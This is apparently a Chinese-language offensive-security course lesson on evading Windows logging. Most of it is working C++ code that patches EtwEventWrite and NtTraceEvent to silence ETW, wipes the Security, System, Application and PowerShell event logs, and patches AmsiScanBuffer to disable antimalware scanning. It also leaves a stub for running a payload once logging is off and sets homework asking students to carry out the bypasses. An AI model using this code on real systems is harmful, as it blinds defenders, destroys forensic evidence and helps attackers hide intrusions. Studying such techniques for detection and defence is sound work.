# 课时09：Windows日志绕过

## 1. 课程概述

### 1.1 学习目标

- 理解Windows事件日志机制
- 掌握ETW（Event Tracing for Windows）原理
- 学会禁用或绕过日志记录
- 理解安全软件的日志监控方式

---

## 2. 名词解释

| 术语 | 说明 |
|------|------|
| **ETW** | Event Tracing for Windows，Windows事件追踪系统 |
| **Event Log** | Windows事件日志 |
| **AMSI** | Antimalware Scan Interface，反恶意软件扫描接口 |
| **Provider** | ETW事件提供者 |
| **Consumer** | ETW事件消费者 |

---

## 3. 技术原理

### 3.1 ETW架构

```
Provider (提供者)  →  ETW Session (会话)  →  Consumer (消费者)
   ↓                        ↓                       ↓
应用/内核产生事件     内核缓冲区             安全软件/日志服务
```

### 3.2 关键的ETW Provider

| Provider | GUID | 用途 |
|----------|------|------|
| Microsoft-Windows-Kernel-Process | {22FB2CD6-...} | 进程事件 |
| Microsoft-Windows-PowerShell | {A0C1853B-...} | PowerShell日志 |
| Microsoft-Antimalware-Engine | {E4B70372-...} | Defender事件 |

---

## 4. 实现代码

### 4.1 禁用ETW（Patch EtwEventWrite）

```cpp
#include <windows.h>
#include <stdio.h>

BOOL DisableETW() {
    // 获取ntdll中的EtwEventWrite
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    
    if (!pEtwEventWrite) {
        printf("[-] EtwEventWrite not found\n");
        return FALSE;
    }
    
    printf("[+] EtwEventWrite at: 0x%p\n", pEtwEventWrite);
    
    // Patch为直接返回
    // x64: xor eax, eax; ret (0x33 0xC0 0xC3)
    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
    
    // 修改内存保护
    DWORD oldProtect;
    if (!VirtualProtect(pEtwEventWrite, sizeof(patch), 
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed\n");
        return FALSE;
    }
    
    // 写入patch
    memcpy(pEtwEventWrite, patch, sizeof(patch));
    
    // 恢复保护
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
    
    printf("[+] ETW disabled!\n");
    return TRUE;
}

int main() {
    printf("========== ETW Bypass ==========\n");
    DisableETW();
    
    // 现在ETW事件不会被记录
    printf("[*] Running payload...\n");
    // ... payload code ...
    
    return 0;
}
```

### 4.2 利用NtTraceEvent绕过

```cpp
// NtTraceEvent是更底层的ETW函数
// 同样可以patch
typedef NTSTATUS(NTAPI* pNtTraceEvent)(
    HANDLE TraceHandle,
    ULONG Flags,
    ULONG FieldSize,
    PVOID Fields
);

BOOL DisableNtTraceEvent() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID pFunc = GetProcAddress(hNtdll, "NtTraceEvent");
    
    if (!pFunc) return FALSE;
    
    BYTE patch[] = { 0xC3 };  // ret
    
    DWORD oldProtect;
    VirtualProtect(pFunc, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)pFunc = 0xC3;
    VirtualProtect(pFunc, 1, oldProtect, &oldProtect);
    
    return TRUE;
}
```

### 4.3 清除事件日志

```cpp
#include <windows.h>
#include <winevt.h>
#include <stdio.h>

#pragma comment(lib, "wevtapi.lib")

BOOL ClearEventLog(LPCWSTR szChannel) {
    EVT_HANDLE hChannel = EvtOpenChannelConfig(NULL, szChannel, 0);
    
    if (!hChannel) {
        printf("[-] Failed to open channel\n");
        return FALSE;
    }
    
    if (!EvtClearLog(NULL, szChannel, NULL, 0)) {
        printf("[-] EvtClearLog failed: %lu\n", GetLastError());
        EvtClose(hChannel);
        return FALSE;
    }
    
    printf("[+] Log cleared: %ws\n", szChannel);
    EvtClose(hChannel);
    return TRUE;
}

int main() {
    // 需要管理员权限
    ClearEventLog(L"Security");
    ClearEventLog(L"System");
    ClearEventLog(L"Application");
    ClearEventLog(L"Windows PowerShell");
    
    return 0;
}
```

---

## 5. AMSI绕过

### 5.1 Patch AmsiScanBuffer

```cpp
BOOL DisableAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        printf("[*] AMSI not loaded\n");
        return TRUE;
    }
    
    PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return FALSE;
    
    // Patch为返回 AMSI_RESULT_CLEAN (0)
    // mov eax, 0x80070057; ret (E_INVALIDARG)
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    
    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), 
                   PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
    
    printf("[+] AMSI disabled!\n");
    return TRUE;
}
```

---

## 6. 安全注意事项

- 禁用日志本身可能被检测
- 清除日志需要管理员权限
- 兩游检测可能发现异常

---

## 7. 课后作业

1. 实现ETW bypass并验证效果
2. 研究其他ETW Provider的禁用方法
3. 尝试绕过AMSI检测

---

## 8. 下一课预告

下一课我们将学习**“进程镂空”**（Process Hollowing）技术。
